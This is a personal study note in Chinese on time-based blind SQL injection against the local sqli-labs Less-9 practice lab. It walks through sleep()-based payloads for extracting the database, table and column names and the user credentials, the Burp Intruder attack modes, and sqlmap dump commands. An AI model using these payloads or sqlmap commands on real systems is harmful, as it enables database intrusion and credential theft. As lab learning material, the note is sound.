# 9
时间盲注：通过返回时间来确定是否有该符号【有'情况下id后面跟‘浏览器页面会返回较慢（左上角会转几圈）】
  sleep（）是*等待几秒
if(A,B,C)`：MySQL 的三元判断

- 如果 `A` 为真 → 执行 `B`，也就是 `sleep(5)`
- 如果 `A` 为假 → 执行 `C`，也就是 `1`，啥延时都没有
get
1.```
http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20if(length(database())=8,sleep(5),1)%20%23
卡住就是对的
2
```
http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr(database(),1,1))=115,sleep(5),1)%20%23
```
substr(str, pos, len)
- **`str`**：要截取的原始字符串
- **`pos`**：起始位置，⚠️ MySQL 这里是从 **1** 开始数，不是从 0
- **`len`**：要取出多少个字符
ascii代表后面要用asc码值
3猜表是把column换成table
limit0，1意思是从第0个开始取一条
猜字段
```
http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27%20limit%200,1),1,1))=105,sleep(5),1)%20%23
```
## **burp**（方便看响应时间）
1.新增临时项目
2.在内置代理浏览器里面打开网址，打开http历史记录![[Pasted image 20261110173919.png]]第二个右键打开repeater
![[Pasted image 20261110173950.png]]
手动改这一部分~~==🟡1‘andsleep(5)不能有空格==~~and和sleep有空格，但是不知道为什么不识别1%27%20and%20sleep%285%29%20and%20%27a%27%3D%27a用这个让他自动识别
这是确定第一位是s
1%27and(if(substr(database(),1,1)%3D%27s%27,sleep(5),1))and(%27a%27%3D%27a%27)%23（手动爆破和网页类似）
### **Burp Intruder**
四种爆破：
1.Sniper
只用一套载荷列表，每次只替换其中一个位置，其余位置保持原值，轮流打每一处标记点
适合：单点注入、单点爆破（你现在只标记 ASCII 数字，就用这个）、逐个参数测注入
2.Battering ram
同样只有一套载荷；每一次发包，把同一个载荷同时塞进全部标记位置
适合：要求多处参数内容必须相同，比如：账号和密码必须填一样的值、
3.Pitchfork
有几个标记位置，就要准备几套独立载荷；按顺序一一对应取出，不会交叉组合
适合：账号字典、密码字典一一配对爆破
4.Cluster bomb
多套载荷，做笛卡尔积，所有组合全部跑一遍
适合：账号密码无配对关系，全部组合尝试

载荷（Payload），就是要往请求里塞进去、用来做测试的那一段内容。
~~(一)尝试爆破~~
~~1.内嵌浏览器抓到后右键sendto intruder~~
~~2.把第一行改成GET /sqli-labs/Less-9/?id=1'%20and%20if(ascii(substr(database(),1,1))=§115§,sleep(5),1)%23 HTTP/1.1~~
~~然后讲右侧改成这样~~
~~![[Pasted image 20261112204538.png]]~~
~~第一处说明返回值类型，第二处是number取值范围；下面url选项取消~~
~~url是一个网址，关掉这个是原样传送，否则自动替换（仅适合普通传参）~~
~~![[Pasted image 20261112205013.png]]~~

~~![[Pasted image 20261112205051.png]]~~
~~3~~
~~?id=1' and ascii(substr(database(),2,1)) > §97§%23~~
~~![[Pasted image 20261112212318.png]]~~不知名原因跑不了

（二）手工改包
1.把第一行改成GET /sqli-labs/Less-9/?id=1'%20and%20if(ascii(substr(database(),1,1))=§115§,sleep(5),1)%23 
反应后是5027millis
2.把第一行再改成GET /sqli-labs/Less-9/?id=1'%20and%20if(ascii(substr(database(),1,1))>110,sleep(5),1)%2，我们用二分法来排查，没有延迟说明第二个字符不在110以上![[Pasted image 20261113170213.png]]
一直筛查区间，比如说下一个字符他的ascii再100之后，那么响应对应的时间就在5秒左右（5000millis）以此类推databse（）是security
2我们先查有几张表，猜测4
```
GET /sqli-labs/Less-9/?id=1%27%20and%20if(substr((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema='security'),1,1)='4',sleep(5),1)%23 HTTP/1.1
```
![[Pasted image 20261113174347.png]]
3.开始猜表名```
GET /sqli-labs/Less-9/?id=1%27%20and%20if(substr((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema='security'),1,1)='4',sleep(5),1)%23 HTTP/1.1

limit a,b  a是第几个，b是第几条
比如说3，4就是第三个表第四条（是完整一条，比如说去库里表明第一行就是完整的emails）
```
GET /sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema='security'%20limit%200,1),1,1))>90,sleep(5),1)%23 HTTP/1.1
Host: 127.0.0.1
```
延迟说明第一个表第一个字符ascii大于90
![[Pasted image 20261113180259.png]]

继续二分发现是e
查询第二个字符m![[Pasted image 20261113180526.png]]这个后面的limit0，1）2，1）0，1是milit中第一张表第一行；2，1是surturb取第二位，取一个字符
以此类推分别是emails,referers,uagents,users
4.再users表里面查
GET /sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_schema='security'%20and%20table_name='users'%20limit%200,1),1,1))>90,sleep(5),1)%23 HTTP/1.1
![[Pasted image 20261113181531.png]]
`limit` 在这里用来切换不同字段：

- `limit 0,1` → `id`
- `limit 1,1` → `username`
- `limit 2,1` → `password``
GET /sqli-labs/Less-9/?id=1%27%20and%20if(ascii(substr((select%20username%20from%20users%20limit%200,1),1,1))>90,sleep(5),1)%23 HTTP/1.1继续猜username和passward
（三）sqlmap
```
py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T -D security -T users -C username,password --batch
```
库
```
py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T --dbs --time-sec=5 --batch --flush-session
```
表
```
py -3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-9/?id=1" --technique=T -D security --tables --time-sec=5 --batch --flush-session
```
![[Pasted image 20261113192737.png]]